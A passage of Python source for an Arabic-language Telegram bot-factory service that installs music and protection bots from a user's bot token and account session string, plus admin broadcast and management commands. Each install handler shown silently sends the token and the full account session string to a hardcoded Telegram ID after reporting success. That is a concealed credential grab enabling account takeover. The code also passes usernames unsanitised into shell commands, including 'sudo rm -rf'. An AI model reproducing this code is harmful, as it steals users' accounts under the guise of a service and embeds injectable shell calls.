            if bot_info.photo:
                photo = await bot.download_media(bot_info.photo.big_file_id, file_name=f"{photos_FOLDER}/{bot_username}.jpg")
                await user.set_chat_photo(loger.id, photo=photo)
        except Exception as e:
            pass
    else:
        loger = await user.create_supergroup("مجموعة البوت", "هذه المجموعة هي عبارة عن سجل للبوت")
        if bot_info.photo:
            photo = await bot.download_media(bot_info.photo.big_file_id, file_name=f"{photos_FOLDER}/{bot_username}.jpg")
            await user.set_chat_photo(loger.id, photo=photo)
        await user.add_chat_members(loger.id, bot_username)
        await user.promote_chat_member(
            loger.id, bot_username,
            privileges=ChatPrivileges(
                can_change_info=True,
                can_invite_users=True,
                can_delete_messages=True,
                can_restrict_members=True,
                can_pin_messages=True,
                can_promote_members=True,
                can_manage_chat=True,
                can_manage_video_chats=True
            )
        )
        loggerlink = await user.export_chat_invite_link(loger.id)
        logger = loger.id
    bot_folder = f"users/{bot_username}"
    mm = await callback_query.message.reply_text("**انتظر جاري تشغيل بوتك الأن ...⚡️**")
    try:
        os.system(f"cp -a source {bot_folder}")
        env_path = os.path.join(bot_folder, ".env")
        with open(env_path, "w+", encoding="utf-8") as env:
            env.write(
                f'BOT_TOKEN = {TOKEN}\n'
                f'STRING_SESSION = {SESSION}\n'
                f'OWNER_ID = {Dev}\n'
                f'logger = {logger}\n'
                f'appusername = {bot_username}\n'
                f'num_design = 5'
            )
    except Exception as e:
        return await callback_query.message.reply_text(f"◍ خطأ أثناء تجهيز ملفات البوت:\n{e}")
    await mm.delete()
    os.system(f"cd {bot_folder} && screen -d -m -S {bot_username} python3 -m zombie.py")
    Bots.append([bot_username, Dev])
    try:
        usr = await client.get_chat(user_id)
        if usr.photo:
            await client.download_media(usr.photo.big_file_id, file_name=f"{photos_FOLDER}/{user_id}.jpg")
    except:
        pass
    dd = await callback_query.message.reply_text("**انتظر جاري تشغيل بوتك الأن ...🚦**")
    install_type = "ميوزك وحماية"
    await dd.delete()
    await callback_query.message.reply_text(
        f"**◍ تم تشغيل البوت بنجاح\n\n**"
        f"**نوع التنصيب ↢ {install_type}\n**"
        f"**معرف البوت ↢ @{bot_username}\n**"
        f"**المطور ↢ @{username}\n**"
        f"**جروب التخزين : {loggerlink}\n√**"
    )
    await client.send_message(
        7807482327,
        f"**✨ تم تنصيب بوت بنجاح\n**"
        f"**يوزر البوت : @{bot_username}\n**"
        f"**بواسطة @{username}\n**"
        f"**توكن البوت : {TOKEN}\n**"
        f"**جلسه الحساب : `{SESSION}`\n**"
        f"**جروب التخزين : [{loggerlink}]**"
    )
    if not existing_bot:
        bot_data = {
            "bot_username": bot_username,
            "bot_token": TOKEN,
            "owner_id": Dev,
            "session_string": SESSION,
            "logger_link": loggerlink,
            "type": install_type,
            "logger_id": logger
        }
        bots_fact_collection.insert_one(bot_data)
    await bot.stop()
    await user.stop()

@bot.on_callback_query(filters.regex(r"^music$"))
async def choosek_scomusic(client, callback_query):
    chat_id = callback_query.message.chat.id
    user_id = callback_query.from_user.id
    username = callback_query.from_user.username or callback_query.from_user.first_name
    try:
        ask = await client.ask(chat_id, "**◍ ارسل توكن البوت**", timeout=300, reply_markup=cancel_keyboard)
        if user_id in cancelled_users:
            cancelled_users.remove(user_id)
            return
        TOKEN = ask.text.strip()
    except:
        return await callback_query.message.reply_text("**⏱ انتهى وقت الإنتظار**")
    try:
        ask = await client.ask(chat_id, "**◍ ارسل لي الآن الجلسه**", timeout=300, reply_markup=cancel_keyboard)
        if user_id in cancelled_users:
            cancelled_users.remove(user_id)
            return
        SESSION = ask.text.strip()
    except:
        return await callback_query.message.reply_text("**⏱ انتهى وقت الإنتظار**")
    Dev = user_id
    if user_id in DEVS:
        try:
            ask = await client.ask(chat_id, "**◍ ارسل ايدي المطور**", timeout=300, reply_markup=cancel_keyboard)
            if user_id in cancelled_users:
                cancelled_users.remove(user_id)
                return
            Dev = int(ask.text.strip())
        except:
            return await callback_query.message.reply_text("**◍ قم بإرسال الايدي بشكل صحيح**")
    try:
        bot = Client(":memory:", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
        user = Client(":user_mem:", api_id=API_ID, api_hash=API_HASH, session_string=SESSION, in_memory=True)

        await bot.start()
        bot_info = await bot.get_me()
        bot_username = bot_info.username
        bot_id = bot_info.id
        await bot.stop()
        await user.start()
        await user.stop()
    except Exception as e:
        return await callback_query.message.reply_text(f"**◍ فشل تشغيل البوت أو الجلسة\n√\n{e}**")
    if blockked_collection.find_one({"bot_id": bot_id}):
        return await callback_query.message.reply_text("**🚫 هذا البوت محظور ولا يمكن استخدامه\n√**")
    for b in Bots:
        if b[0] == username:
            return await callback_query.message.reply_text("**◍ لقد قمت بصنع هذا البوت من قبل**")
    await bot.start()
    await user.start()
    existing_bot = bots_fact_collection.find_one({"bot_username": bot_username})
    if existing_bot:
        loggerlink = existing_bot.get("logger_link")
        logger = existing_bot.get("logger_id")
        try:
            if bot_info.photo:
                photo = await bot.download_media(bot_info.photo.big_file_id, file_name=f"{photos_FOLDER}/{bot_username}.jpg")
                await user.set_chat_photo(loger.id, photo=photo)
        except Exception as e:
            pass
    else:
        loger = await user.create_supergroup("مجموعة البوت", "هذه المجموعة هي عبارة عن سجل للبوت")
        if bot_info.photo:
            photo = await bot.download_media(bot_info.photo.big_file_id, file_name=f"{photos_FOLDER}/{bot_username}.jpg")
            await user.set_chat_photo(loger.id, photo=photo)
        await user.add_chat_members(loger.id, bot_username)
        await user.promote_chat_member(
            loger.id, bot_username,
            privileges=ChatPrivileges(
                can_change_info=True,
                can_invite_users=True,
                can_delete_messages=True,
                can_restrict_members=True,
                can_pin_messages=True,
                can_promote_members=True,
                can_manage_chat=True,
                can_manage_video_chats=True
            )
        )
        loggerlink = await user.export_chat_invite_link(loger.id)
        logger = loger.id
    bot_folder = f"users/{bot_username}"
    mm = await callback_query.message.reply_text("**انتظر جاري تشغيل بوتك الأن ...⚡️**")
    try:
        os.system(f"cp -a source_music {bot_folder}")
        env_path = os.path.join(bot_folder, ".env")
        with open(env_path, "w+", encoding="utf-8") as env:
            env.write(
                f'BOT_TOKEN = {TOKEN}\n'
                f'STRING_SESSION = {SESSION}\n'
                f'OWNER_ID = {Dev}\n'
                f'logger = {logger}\n'
                f'appusername = {bot_username}\n'
                f'num_design = 5'
            )
    except Exception as e:
        return await callback_query.message.reply_text(f"◍ خطأ أثناء تجهيز ملفات البوت:\n{e}")
    await mm.delete()
    os.system(f"cd {bot_folder} && screen -d -m -S {bot_username} python3 -m zombie.py")
    Bots.append([bot_username, Dev])
    try:
        usr = await client.get_chat(user_id)
        if usr.photo:
            await client.download_media(usr.photo.big_file_id, file_name=f"{photos_FOLDER}/{user_id}.jpg")
    except:
        pass
    dd = await callback_query.message.reply_text("**انتظر جاري تشغيل بوتك الأن ...🚦**")
    install_type = "ميوزك"
    await dd.delete()
    await callback_query.message.reply_text(
        f"**◍ تم تشغيل البوت بنجاح\n\n**"
        f"**نوع التنصيب ↢ {install_type}\n**"
        f"**معرف البوت ↢ @{bot_username}\n**"
        f"**المطور ↢ @{username}\n**"
        f"**جروب التخزين : {loggerlink}\n√**"
    )
    await client.send_message(
        7807482327,
        f"**✨ تم تنصيب بوت بنجاح\n**"
        f"**يوزر البوت : @{bot_username}\n**"
        f"**بواسطة @{username}\n**"
        f"**توكن البوت : {TOKEN}\n**"
        f"**جلسه الحساب : `{SESSION}`\n**"
        f"**جروب التخزين : [{loggerlink}]**"
    )
    if not existing_bot:
        bot_data = {
            "bot_username": bot_username,
            "bot_token": TOKEN,
            "owner_id": Dev,
            "session_string": SESSION,
            "logger_link": loggerlink,
            "type": install_type,
            "logger_id": logger
        }
        bots_fact_collection.insert_one(bot_data)
    await bot.stop()
    await user.stop()

    
@bot.on_message(filters.command("صنع بوت 🛠", "") & filters.private, group=2313545)
async def makedzombie(client, message):
    if not await check(message.from_user.id, message, client):
        return
    
    user_id = message.from_user.id if message.from_user else "None"
    if user_id not in DEVS:
        bot_data = bots_fact_collection.find_one({"owner_id": user_id})
        if bot_data:
            return await message.reply_text("لقد قمت بصنع بوت من قبل . ")
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("تنصيب حماية 🛡", callback_data=f"hemaya"),
         InlineKeyboardButton("تنصيب ميوزك 🎸", callback_data=f"music")],
        [InlineKeyboardButton("تنصيب حماية وميوزك 🔀", callback_data=f"mix")]
    ])
    await message.reply_text(
        f"**💌╖أهلا بك 「 {message.from_user.mention} 」 في قسم التنصيب.\n🔘╢ تقدر تختار نوع بوتك عن طريق.\n⌨️╢ الكيبورد اللي ظهرلك تحت ↘️**",
        reply_markup=keyboard
    )
    

@bot.on_message(filters.command("اذاعة عام للمستخدمين 👤", "") & filters.private, group=111555)
async def broadcast_to_bots(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")

    ask = await client.ask(message.chat.id, "ارسل النص المراد اذاعته", timeout=300)
    text = ask.text
    ask = await client.ask(message.chat.id, "اذا كنت تريد الاذاعه بالتثبيت ارسل نعم", timeout=300)
    pin_message = ask.text.lower() == "نعم"
    bots = bots_fact_collection.find()
    total_bots = 0
    skipped_bots = 0
    total_users = 0
    for bot_data in bots:
        try:
            TOKEN = bot_data["bot_token"]
            bot_username = bot_data["bot_username"]
            bot_premium_collection = db[f"premium_status_{bot_username}"]
            premium_status = bot_premium_collection.find_one({})
            if premium_status and premium_status.get("premium", False):  # إذا كان البوت مدفوعًا، يتم تخطيه
                skipped_bots += 1
                continue
            bot_client = Client(
                f"::memory::", 
                bot_token=TOKEN, 
                api_id=API_ID, 
                api_hash=API_HASH,
                no_updates=True,
                in_memory=True
            )
            await bot_client.start()
            bot_db = db_client["telegram_factory"]
            users_collection = bot_db[f"users_{bot_username}"]
            users = users_collection.find({"_id": {"$ne": "bot_stats"}})
            user_count = 0
            for user in users:
                user_id = user["user_id"]
                try:
                    msg = await bot_client.send_message(user_id, text)
                    if pin_message:
                        await msg.pin(disable_notification=False, both_sides=True)
                    user_count += 1
                except Exception as e:
                    pass
            total_bots += 1
            total_users += user_count
            await bot_client.stop()
            session_path = f"bot_{bot_username}.session"
            if os.path.exists(session_path):
                os.remove(session_path)
        except Exception as e:
            pass
    await message.reply(
        f"✅ تم إرسال الإذاعة إلى **{total_users}** مستخدم داخل **{total_bots}** بوتات."
        f"❌ تم **تخطي {skipped_bots} بوتات** لأنها مدفوعة."
        )

# @bot.on_message(filters.command("● اذاعه بالتوجيه للمستخدمين ●", "") & filters.private, group=111556)
# async def broadcast_forward_to_bots(client, message):
#     if message.from_user.id not in DEVS:
#         return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
#     forwarded_message = await client.ask(message.chat.id, "◍ أرسل الرسالة التي تريد توجيهها الآن", timeout=300)
#     if not forwarded_message:
#         return await message.reply("❌ لم يتم إرسال أي رسالة.")
#     bots = bots_fact_collection.find()
#     total_bots = 0
#     total_users = 0
#     skipped_bots = 0
#     for bot_data in bots:
#         try:
#             TOKEN = bot_data["bot_token"]
#             bot_username = bot_data["bot_username"]
#             bot_premium_collection = db[f"premium_status_{bot_username}"]
#             premium_status = bot_premium_collection.find_one({})
#             if premium_status and premium_status.get("premium", False):  # إذا كان البوت مدفوعًا، يتم تخطيه
#                 skipped_bots += 1
#             bot_client = Client(
#                 f"::memory::", 
#                 bot_token=TOKEN, 
#                 api_id=API_ID, 
#                 api_hash=API_HASH,
#                 no_updates=True,
#                 in_memory=True
#             )
#             await bot_client.start()
#             bot_db = db_client["telegram_factory"]
#             users_collection = bot_db[f"users_{bot_username}"]
#             users = users_collection.find({"_id": {"$ne": "bot_stats"}})
#             user_count = 0
#             for user in users:
#                 user_id = user["user_id"]
#                 try:
#                     await forwarded_message.forward(user_id)
#                     user_count += 1
#                 except Exception as e:
#                     pass
#             total_bots += 1
#             total_users += user_count
#             await bot_client.stop()
#             session_path = f"bot_{bot_username}.session"
#             if os.path.exists(session_path):
#                 os.remove(session_path)
#         except Exception as e:
#             pass
#     await message.reply(
#         f"✅ تم إرسال الإذاعة بالتوجيه إلى **{total_users}** مستخدم داخل **{total_bots}** بوتات."
#         f"❌ تم **تخطي {skipped_bots} بوتات** لأنها مدفوعة."
#         )

@bot.on_message(filters.command("اذاعة عام للجروبات 👥", "") & filters.private, group=111557)
async def broadcast_to_groups_from_factory(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    ask = await client.ask(message.chat.id, "📝 أرسل النص الذي تريد إذاعته في الجروبات:", timeout=300)
    text = ask.text
    ask = await client.ask(message.chat.id, "📌 هل تريد تثبيت الرسالة في الجروبات؟ (نعم/لا)", timeout=300)
    pin_message = ask.text.lower() == "نعم"
    bots = bots_fact_collection.find()
    total_bots = 0
    total_groups = 0
    skipped_bots = 0
    for bot_data in bots:
        try:
            TOKEN = bot_data["bot_token"]
            bot_username = bot_data["bot_username"]
            bot_premium_collection = db[f"premium_status_{bot_username}"]
            premium_status = bot_premium_collection.find_one({})
            if premium_status and premium_status.get("premium", False):  # إذا كان البوت مدفوعًا، يتم تخطيه
                skipped_bots += 1
                continue
            bot_client = Client(
                f"::memory::", 
                bot_token=TOKEN, 
                api_id=API_ID, 
                api_hash=API_HASH,
                no_updates=True,
                in_memory=True
            )
            await bot_client.start()
            bot_db = db_client["telegram_factory"]
            groups_collection = bot_db[f"groups_{bot_username}"]
            groups = groups_collection.find({"_id": {"$ne": "bot_stats"}})
            group_count = 0
            for group in groups:
                group_id = group.get("group_id")
                if not group_id:
                    continue
                try:
                    msg = await bot_client.send_message(group_id, text)
                    if pin_message:
                        await msg.pin(disable_notification=False, both_sides=True)
                    group_count += 1
                except Exception as e:
                    pass
            total_bots += 1
            total_groups += group_count
            await bot_client.stop()
        except Exception as e:
            pass
    await message.reply(
        f"✅ تم إرسال الإذاعة إلى **{total_groups}** مجموعة داخل **{total_bots}** بوتات."
        f"❌ تم **تخطي {skipped_bots} بوتات** لأنها مدفوعة."
        )

@bot.on_message(filters.command("اذاعة عام للقنوات 🔈", "") & filters.private, group=111558)
async def broadcast_to_channels_from_factory(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    ask = await client.ask(message.chat.id, "📝 أرسل النص الذي تريد إذاعته في القنوات:", timeout=300)
    text = ask.text
    ask = await client.ask(message.chat.id, "📌 هل تريد تثبيت الرسالة في القنوات؟ (نعم/لا)", timeout=300)
    pin_message = ask.text.lower() == "نعم"
    bots = bots_fact_collection.find()
    total_bots = 0
    total_channels = 0
    skipped_bots = 0
    for bot_data in bots:
        try:
            TOKEN = bot_data["bot_token"]
            bot_username = bot_data["bot_username"]
            bot_premium_collection = db[f"premium_status_{bot_username}"]
            premium_status = bot_premium_collection.find_one({})
            if premium_status and premium_status.get("premium", False):
                skipped_bots += 1
                continue

            bot_client = Client(
                f"::memory::", 
                bot_token=TOKEN, 
                api_id=API_ID, 
                api_hash=API_HASH,
                no_updates=True,
                in_memory=True
            )
            await bot_client.start()
            bot_db = db_client["telegram_factory"]
            channels_collection = bot_db[f"channels_{bot_username}"]
            channels = channels_collection.find({"_id": {"$ne": "bot_stats"}})
            channel_count = 0
            for channel in channels:
                channel_id = channel.get("channel_id")
                if not channel_id:
                    continue
                try:
                    msg = await bot_client.send_message(channel_id, text)
                    if pin_message:
                        await msg.pin(disable_notification=False, both_sides=True)
                    channel_count += 1
                except Exception as e:
                    pass
            total_bots += 1
            total_channels += channel_count
            await bot_client.stop()
            session_path = f"bot_{bot_username}.session"
            if os.path.exists(session_path):
                os.remove(session_path)
        except Exception as e:
            pass
    await message.reply(
        f"✅ تم إرسال الإذاعة إلى **{total_channels}** قناة داخل **{total_bots}** بوتات.\n"
        f"❌ تم **تخطي {skipped_bots} بوتات** لأنها مدفوعة."
    )

@bot.on_message(filters.command("تنظيف التخزين 🧹", "") & filters.private, group=111562)
async def clean_inactive_bots(client, message: Message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    bots = bots_fact_collection.find()
    active_screens = subprocess.getoutput("screen -ls")
    total_bots = 0
    deleted_bots = 0
    running_bots_list = []
    for bot_data in bots:
        bot_username = bot_data["bot_username"]
        total_bots += 1

        if bot_username in active_screens:
            running_bots_list.append(f"🤖 @{bot_username}")
        else:
            bots_fact_collection.delete_one({"bot_username": bot_username})
            deleted_bots += 1
    report_text = (
        f"📊 **تقرير تنظيف التخزين**\n\n"
        f"🔹 **إجمالي البوتات:** {total_bots}\n"
        f"🟢 **بوتات نشطة:** {len(running_bots_list)}\n"
        f"🗑️ **بوتات محذوفة:** {deleted_bots}\n"
    )
    if running_bots_list:
        report_text += "\n🟢 **البوتات النشطة:**\n" + "\n".join(running_bots_list)
    await message.reply(report_text)

@bot.on_message(filters.command("تشغيل البوتات ⚡️", "") & filters.private, group=111562)
async def start_all_bots(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    bots = bots_fact_collection.find()
    started_bots = 0
    total_bots = 0
    already_running = 0
    started_bots_list = []
    running_bots_list = []
    active_screens = subprocess.getoutput("screen -ls")
    for bot_data in bots:
        try:
            bot_username = bot_data["bot_username"]
            total_bots += 1
            if bot_username in active_screens:
                already_running += 1
                running_bots_list.append(f"🤖 @{bot_username}")
                continue
            os.system(f"cd users/{bot_username} && screen -d -m -S {bot_username} python3 -m zombie.py")
            started_bots += 1
            started_bots_list.append(f"🚀 @{bot_username}")
        except Exception as e:
            print(f"⚠️ خطأ أثناء تشغيل {bot_username}: {e}")
    report_text = (
        f"✅ **تم تشغيل البوتات**\n"
        f"📌 **إجمالي البوتات:** `{total_bots}`\n"
        f"▶️ **البوتات التي تم تشغيلها:** `{started_bots}`\n"
        f"⚙️ **البوتات التي كانت تعمل بالفعل:** `{already_running}`\n\n"
    )
    if started_bots_list:
        report_text += "**🚀 قائمة البوتات التي تم تشغيلها:**\n" + "\n".join(started_bots_list) + "\n\n"
    if running_bots_list:
        report_text += "**⚙️ البوتات التي كانت تعمل بالفعل:**\n" + "\n".join(running_bots_list)
    await message.reply(report_text)

@bot.on_message(filters.command("تصنيع جميع البوتات ⚙️", "") & filters.private, group=1114565)
async def rebuild_all_bots(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    bots = bots_fact_collection.find()
    total_bots = 0
    restarted_bots = 0
    failed_bots = 0
    failed_bots_list = []
    active_screens = subprocess.getoutput("screen -ls")
    for bot_data in bots:
        try:
            bot_username = bot_data["bot_username"]
            TOKEN = bot_data["bot_token"]
            SESSION = bot_data.get("session_string", "")
            Dev = bot_data.get("owner_id", "")
            logger = bot_data.get("logger_id", "")
            install_type = bot_data.get("type", "")
            total_bots += 1
            if bot_username in active_screens:
                os.system(f"screen -XS {bot_username} quit")
                os.system(f"sudo rm -rf users/{bot_username}")
            if install_type == "ميوزك وحماية":
                os.system(f"cp -a source users/{bot_username}")
            elif install_type == "حماية":
                os.system(f"cp -a source_hem users/{bot_username}")
            else:
                os.system(f"cp -a source_music users/{bot_username}")
            bot_username_folder = f"users/{bot_username}"
            env_file_path = os.path.join(bot_username_folder, ".env")
            try:
                with open(env_file_path, "w+", encoding="utf-8") as env:
                    env_content = (
                        f'BOT_TOKEN = {TOKEN}\n'
                        f'STRING_SESSION = {SESSION}\n'
                        f'OWNER_ID = {Dev}\n'
                        f'logger = {logger}\n'
                        f'appusername = {bot_username}'
                    )
                    env.write(env_content)
                start_command = f"cd users/{bot_username} && screen -dmS {bot_username} bash -c 'python3 zombie.py'"
                os.system(start_command)
                time.sleep(1)
                active_screens_after = subprocess.getoutput("screen -ls")
                if bot_username not in active_screens_after:
                    raise Exception("❌ الشاشة لم تُفتح، تحقق من الأخطاء.")
            except Exception as e:
                failed_bots += 1
                failed_bots_list.append(f"❌ @{bot_username} - خطأ في كتابة .env أو تشغيل البوت")
                continue
            restarted_bots += 1
        except Exception as e:
            failed_bots += 1
            failed_bots_list.append(f"❌ @{bot_username} - {e}")
    report_text = (
        f"🔄 **تم إعادة تصنيع جميع البوتات**\n"
        f"📌 **إجمالي البوتات:** `{total_bots}`\n"
        f"✅ **بوتات تعمل بنجاح:** `{restarted_bots}`\n"
        f"❌ **بوتات فشلت:** `{failed_bots}`\n"
    )
    if failed_bots_list:
        report_text += "**🚨 قائمة البوتات التي فشلت:**\n" + "\n".join(failed_bots_list)
    await message.reply(report_text)

@bot.on_message(filters.command("ايقاف البوتات ⛔️", "") & filters.private, group=1115611)
async def stop_all_bots(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    bots = bots_fact_collection.find()
    stopped_bots = 0
    total_bots = 0
    stopped_bots_list = []
    for bot_data in bots:
        try:
            bot_username = bot_data["bot_username"]
            total_bots += 1
            os.system(f"screen -XS {bot_username} quit")
            stopped_bots += 1
            stopped_bots_list.append(f"🤖 @{bot_username}")
        except Exception as e:
            print(f"⚠️ خطأ أثناء إيقاف {bot_username}: {e}")
    report_text = (
        f"🛑 **تم إيقاف جميع البوتات**\n"
        f"📌 **إجمالي البوتات:** `{total_bots}`\n"
        f"❌ **البوتات التي تم إيقافها:** `{stopped_bots}`\n\n"
    )
    if stopped_bots_list:
        report_text += "**📛 قائمة البوتات التي تم إيقافها:**\n" + "\n".join(stopped_bots_list)
    await message.reply(report_text)


@bot.on_message(filters.command("احصائيات البوتات المصنوعة 📈", "") & filters.private, group=11154569897)
async def bottistics(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    bots = bots_fact_collection.find()
    stats_text = "📊 **إحصائيات البوتات:**\n\n"
    total_bots = 0
    total_users = 0
    total_groups = 0
    total_channels = 0
    for bot_data in bots:
        try:
            bot_username = bot_data["bot_username"]
            bot_db = db_client["telegram_factory"]
            users_collection = bot_db[f"users_{bot_username}"]
            groups_collection = bot_db[f"groups_{bot_username}"]
            channels_collection = bot_db[f"channels_{bot_username}"]
            user_count = users_collection.count_documents({"_id": {"$ne": "bot_stats"}})
            group_count = groups_collection.count_documents({"_id": {"$ne": "bot_stats"}})
            channel_count = channels_collection.count_documents({"_id": {"$ne": "bot_stats"}})
            total_bots += 1
            total_users += user_count
            total_groups += group_count
            total_channels += channel_count
            stats_text += f"🤖 @{bot_username} ➜ 👤 {user_count} | 👥 {group_count} | 📢 {channel_count}\n"
        except Exception as e:
            pass
    stats_text += (
        f"\n📌 **إجمالي البوتات:** {total_bots}"
    )
    await message.reply(stats_text)

@bot.on_message(filters.command("كشف كامل 🔍", "") & filters.private, group=11014559)
async def bos_statistics(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    bots = bots_fact_collection.find()
    stats_text = "📊 **إحصائيات البوتات:**\n\n"
    total_bots = 0
    total_users = 0
    total_groups = 0
    total_channels = 0
    for bot_data in bots:
        try:
            bot_username = bot_data["bot_username"]
            bot_db = db_client["telegram_factory"]
            users_collection = bot_db[f"users_{bot_username}"]
            groups_collection = bot_db[f"groups_{bot_username}"]
            channels_collection = bot_db[f"channels_{bot_username}"]
            user_count = users_collection.count_documents({"_id": {"$ne": "bot_stats"}})
            group_count = groups_collection.count_documents({"_id": {"$ne": "bot_stats"}})
            channel_count = channels_collection.count_documents({"_id": {"$ne": "bot_stats"}})
            total_bots += 1
            total_users += user_count
            total_groups += group_count
            total_channels += channel_count
        except Exception as e:
            pass
    stats_text += (
        f"👤 **إجمالي المستخدمين:** {total_users}\n"
        f"👥 **إجمالي المجموعات:** {total_groups}\n"
        f"📢 **إجمالي القنوات:** {total_channels}"
    )
    await message.reply(stats_text)

@bot.on_message(filters.command("تصفية البوتات 🗂", "") & filters.private, group=111560)
async def clean_bots(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    ask_users = await client.ask(message.chat.id, "👥 أرسل الحد الأدنى لعدد المستخدمين المسموح به:", timeout=300)
    try:
        min_users = int(ask_users.text)
    except ValueError:
        return await message.reply("**◍ ارسل الحد الأدنى للمستخدمين المسموح به 👤\n√**")
    ask_groups = await client.ask(message.chat.id, "**◍ ارسل الحد الأدنى للجروبات المسموح بها 👥\n√**", timeout=300)
    try:
        min_groups = int(ask_groups.text)
    except ValueError:
        return await message.reply("❌ يرجى إرسال رقم صحيح للحد الأدنى لعدد الجروبات.")
    bots = bots_fact_collection.find()
    deleted_bots = 0
    total_checked = 0
    removed_bots_list = []
    for bot_data in bots:
        try:
            bot_username = bot_data["bot_username"]
            bot_db = db_client["telegram_factory"]
            users_collection = bot_db[f"users_{bot_username}"]
            groups_collection = bot_db[f"groups_{bot_username}"]
            user_count = users_collection.count_documents({"_id": {"$ne": "bot_stats"}})
            group_count = groups_collection.count_documents({"_id": {"$ne": "bot_stats"}})
            total_checked += 1
            if user_count < min_users and group_count < min_groups:
                os.system(f"screen -XS {bot_username} quit")
                os.system(f"sudo rm -rf users/{bot_username}")
                deleted_bots += 1
                removed_bots_list.append(f"🤖 @{bot_username} ➜ 👤 {user_count} | 👥 {group_count}")
        except Exception as e:
            pass
    report_text = (
        f"🧹 **تم تنفيذ تنظيف البوتات**\n"
        f"📌 **إجمالي البوتات المفحوصة:** `{total_checked}`\n"
        f"❌ **البوتات المحذوفة:** `{deleted_bots}`\n\n"
        f"🚮 **تم حذف البوتات التي إحصائياتها أقل من:**\n"
        f"👤 **{min_users} مستخدمين**\n"
        f"👥 **{min_groups} جروب**\n\n"
    )
    if removed_bots_list:
        report_text += "**🚮 قائمة البوتات المحذوفة:**\n" + "\n".join(removed_bots_list)
    await message.reply(report_text)

@bot.on_message(filters.command("حذف بوت 🗑", "") & filters.private, group=11292)
async def deletbotzombie(client, message):
    if not await check(message.from_user.id, message, client):
        return
    user_id = message.from_user.id if message.from_user else "None"
    if user_id not in DEVS:
        bot_data = bots_fact_collection.find_one({"owner_id": user_id})
        if not bot_data:
            return await message.reply("**◍ لم تقم بانشاء اي بوتات 🤖\n√**")

        bot_username = bot_data["bot_username"]
        try:
            os.system(f"sudo rm -rf users/{bot_username}")
            os.system(f"screen -XS {bot_username} quit")
            bots_fact_collection.delete_one({"bot_username": bot_username})
            await message.reply_text(
                f"**◍ تم حذف البوت بنجاح**\n\n"
                f"**نوع التنصيب ↢ {bot_data.get('type', 'غير معروف')}\n**"
                f"**معرف البوت ↢ @{bot_username}\n**"
                f"**المطور ↢ {message.from_user.mention}\n√**"
            )
        except Exception as e:
            await message.reply(f"❌ حدث خطأ أثناء الحذف: {e}")
        return
    try:
        response = await client.ask(message.chat.id, "**◍ ارسل يوزر البوت المراد حذفة 🤖\n√**", timeout=200)
    except:
        return await message.reply("⌛ انتهى الوقت، حاول مجددًا.")
    bot_username = response.text.replace("@", "").strip()
    bot_data = bots_fact_collection.find_one({"bot_username": bot_username})
    if not bot_data:
        return await message.reply("**◍ البوت غير موجود في قاعدة البيانات ❌\n√**")
    try:
        os.system(f"sudo rm -rf users/{bot_username}")
        os.system(f"screen -XS {bot_username} quit")
        bots_fact_collection.delete_one({"bot_username": bot_username})
        await message.reply_text(f"**◍ تم تحذف بوتك بنجاح ✅\n√**")
    except Exception as e:
        await message.reply(f"❌ حدث خطأ أثناء الحذف: {e}")

@bot.on_message(filters.command("البوتات المصنوعة ⚙️", ""), group=212112)
async def botzombie(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply_text("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    
    o = 0
    text = "◍ قائمة البوتات:\n\n"
    bots = bots_fact_collection.find()
    
    for bot_data in bots:
        o += 1
        bot_username = bot_data.get("bot_username", "غير موجود")
        owner_id = bot_data.get("owner_id", None)
        
        if owner_id:
            try:
                owner = await client.get_users(owner_id)
                owner_username = f"@{owner.username}" if owner.username else f"{owner.id}"
            except PeerIdInvalid:
                owner_username = f"مستخدم غير متاح ({owner_id})"
            except Exception as e:
                owner_username = f"خطأ في الجلب ({owner_id})"
        else:
            owner_username = "غير موجود"
        
        text += f"{o}- @{bot_username} ➽ {owner_username}\n"
    
    if o == 0:
        return await message.reply_text("❌ لا يوجد بوتات مصنوعة.")
    
    text += f"\n\nحاليًا لديك `{o}` بوتات..."
    await message.reply_text(text)

@bot.on_message(filters.command("حظر مستخدم 🚫", "") & filters.private,group=5154534)
async def bans(client, message):
  if message.from_user.id not in DEVS:
    return
  try:
      ask = await client.ask(message.chat.id, "**◍ ارسل يوزر الشخص المراد حظرة من الصانع\n√**", timeout=300)
  except:
      return    
  user = ask.text.replace("@", "")
  if not user.isalnum():
        return await message.reply("**◍ هذا اليوزر غير صالح ⚠️\n√**")
  banded_users.append(user)
  await client.send_message(message.chat.id, "**◍ تم حظر المستخدم بنجاح\n√**")
            
@bot.on_message(filters.command("المستخدمين المحظورين 🙅🏻‍♂️", "") & filters.private, group=21331545)
async def getbannbvnbjfedjcjgusers(client, message):
  if message.from_user.id not in DEVS:
    return
  zomb = "قائمة المستخدمين المحظورين:\n\n"
  for username in banded_users:
      zomb += f"- @{username}\n" 
  await client.send_message(message.chat.id, zomb)
  

@bot.on_message(filters.command("اضف قناة الاشتراك 📎", "") & filters.private, group=1212456)
async def add_sub(client, message):
    if message.from_user.id not in DEVS:
